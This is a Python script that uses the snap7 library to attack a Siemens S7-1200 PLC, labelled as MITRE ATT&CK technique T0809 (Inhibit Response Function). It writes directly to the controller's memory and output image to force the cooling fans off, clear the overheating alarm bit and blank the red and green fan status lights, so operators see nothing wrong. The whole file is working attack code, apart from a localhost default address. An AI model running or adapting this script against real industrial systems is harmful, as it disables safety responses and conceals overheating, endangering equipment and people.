import snap7
import struct
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# PLC Configuration -  Adjust these if necessary
PLC_IP = '127.0.0.1'  # Replace with the actual PLC IP address.  Consider auto-discovery (see note below).
RACK = 0
SLOT = 1
DB_NUMBER = 1  # Assuming your tags are mostly in DB1, but this script will modify outputs and M memory directly.
START_ADDRESS = 0 # byte address where our important bits and bytes exist, assuming it all starts at M0, but may vary if you use I or Q memory locations.

# Tag Addresses (Memory locations). Refer to your tag table.
# These need to be byte addresses.
ACTIVATE_FAN_A_ADDRESS = 0 # M0.0 Byte address
ACTIVATE_FAN_B_ADDRESS = 0 # M0.1 Byte address
MASTER_FAN_B_HMI_ADDRESS = 0 # M0.5 Byte address
OVERHEATING_CHECK_ADDRESS = 0 # M0.2 Byte Address

FAN_A_ADDRESS = 8 # %Q0.0. It will be used as the offset for the Q memory
FAN_B_ADDRESS = 8 # %Q0.1. It will be used as the offset for the Q memory
FAN_A_RED_ADDRESS = 8 # %Q0.4. It will be used as the offset for the Q memory
FAN_A_GREEN_ADDRESS = 8 # %Q0.5. It will be used as the offset for the Q memory
FAN_B_RED_ADDRESS = 8 # %Q0.2. It will be used as the offset for the Q memory
FAN_B_GREEN_ADDRESS = 8 # %Q0.3. It will be used as the offset for the Q memory

BYTE_MB5_ADDRESS = 5
BYTE_MB6_ADDRESS = 6
INT_MW7_ADDRESS = 7

# *** IMPORTANT: I/O Image Manipulation ***
# This script focuses on manipulating the memory where the I/O image is stored.
# This is a direct way to inhibit response functions.  We will directly 
# change the values of key tags to influence the PLC's behavior.

def connect_to_plc(ip, rack, slot):
    """Connects to the Siemens S7-1200 PLC."""
    plc = snap7.client.Client()
    try:
        plc.connect(ip, rack, slot)
        logging.info(f"Connected to PLC at {ip}, Rack {rack}, Slot {slot}")
        return plc
    except Exception as e:
        logging.error(f"Error connecting to PLC: {e}")
        return None

def disconnect_from_plc(plc):
    """Disconnects from the PLC."""
    if plc and plc.get_connected():
        plc.disconnect()
        logging.info("Disconnected from PLC.")

def read_memory_area(plc, area, db_number, start, size):
    """Reads a memory area from the PLC. Area can be S7AreaPA (Outputs), S7AreaPE (Inputs), S7AreaMK (Merker/Memory), S7AreaDB (Data Block)"""
    try:
        data = plc.read_area(area, db_number, start, size)
        return data
    except Exception as e:
        logging.error(f"Error reading memory area: {e}")
        return None

def write_memory_area(plc, area, db_number, start, size, data):
    """Writes data to a memory area in the PLC."""
    try:
        plc.write_area(area, db_number, start, size, data)
        logging.info(f"Successfully wrote to area {area}, DB {db_number}, start {start}, size {size}")
    except Exception as e:
        logging.error(f"Error writing to memory area: {e}")

def set_bit(data, byte_index, bit_index):
    """Sets a specific bit in a byte array."""
    byte_value = data[byte_index]
    byte_value |= (1 << bit_index)
    data[byte_index] = byte_value
    return data

def clear_bit(data, byte_index, bit_index):
    """Clears a specific bit in a byte array."""
    byte_value = data[byte_index]
    byte_value &= ~(1 << bit_index)
    data[byte_index] = byte_value
    return data

def read_int(data, byte_index):
    """Reads an integer from a byte array, starting at the given byte index."""
    return struct.unpack(">h", data[byte_index:byte_index+2])[0] # ">h" for big-endian short (2 bytes)

def write_int(data, byte_index, value):
    """Writes an integer to a byte array, starting at the given byte index."""
    struct.pack_into(">h", data, byte_index, value)  # ">h" for big-endian short (2 bytes)
    return data

def manipulate_fan_control(plc):
    """
    Manipulates the fan control logic to inhibit response functions.
    This example forces Fan A and Fan B to be always OFF, regardless of temperature.
    It also overrides the overheating check.

    MITRE ATT&CK Technique: Inhibit Response Function (T0809)
    Sub-technique: Manipulate I/O Image
    """
    try:
        # 1. Read the current memory (Merker/Memory area)  - adjust the size based on your memory map
        #    We're reading enough bytes to cover the tags we want to manipulate
        memory_size = 11 # Adjust if needed. Covers up to MB10 based on the tags
        memory_area = snap7.types.S7AreaMK  # Merker area (Memory bits)
        initial_memory = read_memory_area(plc, memory_area, 0, START_ADDRESS, memory_size) # DB number doesn't matter here since we are targeting M memory.
        if initial_memory is None:
            logging.error("Failed to read memory.  Exiting manipulation.")
            return

        # Create a copy to modify
        modified_memory = bytearray(initial_memory)

        # 2. Force Fan A and Fan B to be OFF.  This overrides the temperature-based control.
        modified_memory = clear_bit(modified_memory, ACTIVATE_FAN_A_ADDRESS, 0)  # Clear Activate_Fan_A (M0.0)
        modified_memory = clear_bit(modified_memory, ACTIVATE_FAN_B_ADDRESS, 1)  # Clear Activate_Fan_B (M0.1)

        # 3. Override Overheating Check to always FALSE, preventing any alarm.
        modified_memory = clear_bit(modified_memory, OVERHEATING_CHECK_ADDRESS, 2)  # Clear Overheating_Check (M0.2)

        # 4. Write the modified memory back to the PLC
        write_memory_area(plc, memory_area, 0, START_ADDRESS, memory_size, modified_memory) # DB number irrelevant since we are working directly with M memory.

        logging.info("Fan control manipulation complete.  Fans forced OFF, overheating check disabled.")

        # Manipulate the Q memory for the fan status light indicators and fan coil control signals.
        output_size = 1
        output_area = snap7.types.S7AreaPA
        initial_output = read_memory_area(plc, output_area, 0, FAN_A_ADDRESS, output_size)
        modified_output = bytearray(initial_output)

        modified_output = clear_bit(modified_output, 0, 0) # fan_a = False
        modified_output = clear_bit(modified_output, 0, 1) # fan_b = False
        modified_output = clear_bit(modified_output, 0, 4) # fan_a_red = False
        modified_output = clear_bit(modified_output, 0, 5) # fan_a_green = False
        modified_output = clear_bit(modified_output, 0, 2) # fan_b_red = False
        modified_output = clear_bit(modified_output, 0, 3) # fan_b_green = False
        write_memory_area(plc, output_area, 0, FAN_A_ADDRESS, output_size, modified_output)
        logging.info("Fan control manipulation complete.  Output memory has been overwritten for indicator status.")

    except Exception as e:
        logging.error(f"Error during fan control manipulation: {e}")

def main():
    """Main function to connect to the PLC, manipulate the fan control, and disconnect."""
    plc = connect_to_plc(PLC_IP, RACK, SLOT)
    if plc:
        manipulate_fan_control(plc)
        disconnect_from_plc(plc)
    else:
        logging.error("Could not connect to PLC.  Exiting.")

if __name__ == "__main__":
    main()